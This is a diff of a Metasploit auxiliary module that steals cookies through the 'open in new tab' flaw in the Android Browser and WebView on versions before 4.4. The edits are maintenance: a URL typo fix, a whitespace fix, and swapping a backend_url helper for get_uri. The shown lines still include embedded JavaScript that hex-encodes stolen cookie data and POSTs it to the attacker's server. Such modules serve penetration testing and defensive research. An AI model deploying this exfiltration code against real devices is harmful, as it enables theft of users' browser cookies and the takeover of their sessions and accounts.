@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -16,7 +16,7 @@ class Metasploit3 < Msf::Auxiliary
     super(update_info(info,
       'Name'        => 'Android Browser "Open in New Tab" Cookie Theft',
       'Description' => %q{
-        In Android (AOSP)'s Browser application and WebView component the  
+        In Android (AOSP)'s Browser application and WebView component the
         "open in new tab" functionality allows a file URL to be opened. On
         versions of Android before 4.4, the path to the sqlite cookie
         database could be specified. By saving a cookie containing a <script>
@@ -110,7 +110,7 @@ class Metasploit3 < Msf::Auxiliary
               return (c.length < 2) ? '0'+c : c;
             }).join('');
             var x2 = new XMLHttpRequest();
-            x2.open('POST', '#{backend_url}/');
+            x2.open('POST', '#{get_uri}/');
             x2.setRequestHeader('Content-type', 'text/plain');
             x2.send(hex);
           }
@@ -130,13 +130,7 @@ class Metasploit3 < Msf::Auxiliary
     '/data/data/com.android.browser/databases/' + file
   end
 
-  def backend_url
-    proto = (datastore["SSL"] ? "https" : "http")
-    myhost = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address : datastore['SRVHOST']
-    port_str = (datastore['SRVPORT'].to_i == 80) ? '' : ":#{datastore['SRVPORT']}"
-    "#{proto}://#{myhost}#{port_str}/#{datastore['URIPATH'].gsub(/^\//, '')}"
-  end
-
+  # TODO: Make this a proper Rex::Text function
   def hex2bin(hex)
     hex.chars.each_slice(2).map(&:join).map { |c| c.to_i(16) }.map(&:chr).join
   end
